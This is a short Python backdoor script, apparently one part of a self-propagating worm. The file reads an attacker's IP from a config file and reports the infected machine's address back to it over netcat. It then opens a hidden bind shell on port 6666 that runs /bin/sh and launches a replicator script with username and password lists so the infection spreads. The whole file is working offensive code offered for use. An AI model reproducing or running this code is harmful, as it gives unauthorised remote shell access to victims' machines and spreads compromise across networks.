""" local_backdoor.py : executed once it is placed in a target system
    Creates a netcar listener that listens on port 6666 for incoming connections
    Once a connection is established, a remote shell will spawn for the attacker
    Also reports that it has been infected back to the initial IP
"""
import sys
import os
from subprocess import call
import nclib
import socket

def main():
    """ Main function - used to set up a netcat listener """

    try:
        with open("SSHConnection.py", "r") as config_file:
            attacker = config_file.readline()[1:-1].strip()
        nc = nclib.Netcat((attacker, 1234))

        #IP Retrieval from https://stackoverflow.com/a/30990617htt
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80))
        thisIP = s.getsockname()[0]

        nc.send(thisIP)
        call(["nohup netcat -l -p 6666 -e /bin/sh &"], shell=True)
        nc.close()
    except Exception as somethingbadhappened:
        pass
    """ Run backdoor.py again here? Or maybe another script to propgate the worm """
    call("python replicator.py local_backdoor.py usernames.txt passwords.txt".split(" "))

if __name__ == "__main__":
    main()

